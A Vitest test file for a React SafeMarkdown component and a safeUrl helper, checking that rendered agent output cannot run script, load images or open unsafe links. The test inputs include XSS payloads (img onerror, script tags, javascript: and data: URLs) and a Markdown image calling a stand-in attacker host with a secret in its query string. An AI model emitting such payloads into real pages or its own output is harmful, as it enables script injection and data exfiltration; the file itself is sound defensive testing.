import { render, screen } from '@testing-library/react'
import { describe, expect, it } from 'vitest'
import { SafeMarkdown } from './SafeMarkdown'
import { safeUrl } from '../../lib/safeUrl'

describe('SafeMarkdown (R-M10, T-UI-4)', () => {
  it('never renders raw HTML as elements', () => {
    const { container } = render(<SafeMarkdown>{'hi <img src="https://attacker.example/x.png" onerror="alert(1)"> <script>alert(2)</script> <iframe src="https://x.example"></iframe> <b onclick="x()">bold</b>'}</SafeMarkdown>)
    for (const tag of ['img', 'script', 'iframe', 'b']) expect(container.querySelector(tag)).toBeNull()
    expect(container.querySelector('[onerror],[onclick]')).toBeNull()
    // Shown as text, so the reader still sees what the agent wrote.
    expect(container.textContent).toContain('<script>alert(2)</script>')
  })

  it('never loads Markdown images; shows a placeholder with the URL', () => {
    const { container } = render(<SafeMarkdown>{'![chart](https://attacker.example/pixel.png?d=secret)'}</SafeMarkdown>)
    expect(container.querySelector('img')).toBeNull()
    expect(container.querySelector('[data-blocked-image]')).not.toBeNull()
    expect(container.textContent).toContain('https://attacker.example/pixel.png?d=secret')
  })

  it('shows the full URL of every link and opens it safely', () => {
    render(<SafeMarkdown>{'See [the docs](https://evil.example/login?next=amp) and https://amp.example/x'}</SafeMarkdown>)
    const links = screen.getAllByRole('link')
    expect(links).toHaveLength(2)
    expect(links[0]).toHaveAttribute('href', 'https://evil.example/login?next=amp')
    expect(links[0]).toHaveTextContent('the docs (https://evil.example/login?next=amp)')
    expect(links[1]).toHaveTextContent('https://amp.example/x')
    for (const a of links) {
      expect(a).toHaveAttribute('target', '_blank')
      expect(a.getAttribute('rel')).toContain('noopener')
      expect(a.getAttribute('rel')).toContain('noreferrer')
    }
  })

  it('drops javascript: and data: links', () => {
    const { container } = render(<SafeMarkdown>{'[click](javascript:alert(1)) [d](data:text/html,<b>x</b>)'}</SafeMarkdown>)
    expect(container.querySelector('a')).toBeNull()
    expect(container.textContent).toContain('click')
  })

  it('safeUrl keeps only http(s) and mailto', () => {
    expect(safeUrl('https://a.example')).toBe('https://a.example')
    expect(safeUrl('mailto:x@y.z')).toBe('mailto:x@y.z')
    expect(safeUrl(' JavaScript:alert(1)')).toBe('')
    expect(safeUrl('data:image/png;base64,AAA')).toBe('')
    expect(safeUrl('/relative')).toBe('')
  })
})
